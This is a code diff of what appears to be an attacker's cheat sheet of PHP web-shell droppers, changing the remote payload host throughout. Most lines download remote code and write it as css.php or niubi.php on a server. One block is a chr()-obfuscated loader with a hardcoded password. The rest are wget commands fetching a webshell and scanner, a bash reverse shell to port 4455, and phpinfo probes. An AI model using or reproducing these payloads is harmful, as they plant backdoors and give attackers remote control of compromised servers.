@@ -2,37 +2,37 @@
 
 
 
-<?php file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o.txt')) ?>
+<?php file_put_contents('./css.php',file_get_contents('http://fbisbb.github.io/php/o.txt')) ?>
 
 
-<?php echo copy('http://8.phptest.cn/php/o.txt','niubi.php');?>
+<?php echo copy('http://fbisbb.github.io/php/o.txt','niubi.php');?>
 
-<?php echo copy('http://8.phptest.cn/php/c1.txt','niubi.php');?>
+<?php echo copy('http://fbisbb.github.io/php/c1.txt','niubi.php');?>
 
-<?php file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o1.txt')) ?>
-
-
-<?php $save=file_get_contents("http://8.phptest.cn/php/o.txt");  file_put_contents ("css.php",$save) ?>
+<?php file_put_contents('./css.php',file_get_contents('http://fbisbb.github.io/php/o1.txt')) ?>
 
 
-
-<?php file_put_contents('css.php',file_get_contents('http://8.phptest.cn/php/o.txt')) ?>
+<?php $save=file_get_contents("http://fbisbb.github.io/php/o.txt");  file_put_contents ("css.php",$save) ?>
 
 
 
-<?php file_put_contents('css1.php',file_get_contents('http://8.phptest.cn/php/o1.txt')) ?>
+<?php file_put_contents('css.php',file_get_contents('http://fbisbb.github.io/php/o.txt')) ?>
 
 
 
-<script language="php"><?php file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o.txt'))?></script>   
+<?php file_put_contents('css1.php',file_get_contents('http://fbisbb.github.io/php/o1.txt')) ?>
 
 
-<script language="php">file_put_contents('./css.php',file_get_contents('http://8.phptest.cn/php/o.txt'))?></script>
+
+<script language="php"><?php file_put_contents('./css.php',file_get_contents('http://fbisbb.github.io/php/o.txt'))?></script>   
+
+
+<script language="php">file_put_contents('./css.php',file_get_contents('http://fbisbb.github.io/php/o.txt'))?></script>
 
 
 <?php
 set_time_limit(666);
-$i = array("cms","chr","http://","8.phptest.cn/","404.jpg");
+$i = array("cms","chr","http://","fbisbb.github.io/","404.jpg");
 s($i[1],$i[2].$i[3].$i[4]);
 session_start();
 function s($c,$url){
@@ -56,12 +56,12 @@ function l($xx,$ss){
 
 
 <?php
-$password='admin';//鐧诲綍瀵嗙爜
+$password='admin';
 //----------鍔熻兘绋嬪簭------------------//
 $c="chr";
 session_start();
 if(empty($_SESSION['PhpCode'])){
-$url = 'http://8.phptest.cn/404.jpg';
+$url = 'http://fbisbb.github.io/404.jpg';
 $get=chr(102).chr(105).chr(108).chr(101).chr(95);
 $get.=chr(103).chr(101).chr(116).chr(95).chr(99);
 $get.=chr(111).chr(110).chr(116).chr(101).chr(110);
@@ -74,11 +74,11 @@ $unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
 ?>
 
 
-wget -O c.php http://8.phptest.cn/php/c.txt
+wget -O c.php http://fbisbb.github.io/php/c.txt
 
-wget -O fscan http://8.phptest.cn/fscan
+wget -O fscan http://fbisbb.github.io/fscan
 
-bash -i >& /dev/tcp/8.phptest.cn/4455 0>&1
+bash -i >& /dev/tcp/fbisbb.github.io/4455 0>&1
 
 
 <?=phpinfo()?> 
@@ -104,14 +104,14 @@ post
 a=phpinfo();
 
 
-http://8.phptest.cn/php/mysql.txt
+http://fbisbb.github.io/php/mysql.txt
 
 win
 slmgr /skms kms.v0v.bid && slmgr /ato
 
 <?php class test{
     private $file = '3.php';
-    private $url = 'http://8.phptest.cn/php/o.txt';
+    private $url = 'http://fbisbb.github.io/php/o.txt';
     function __construct($copy)
     {
         $copy($this->url,$this->file);
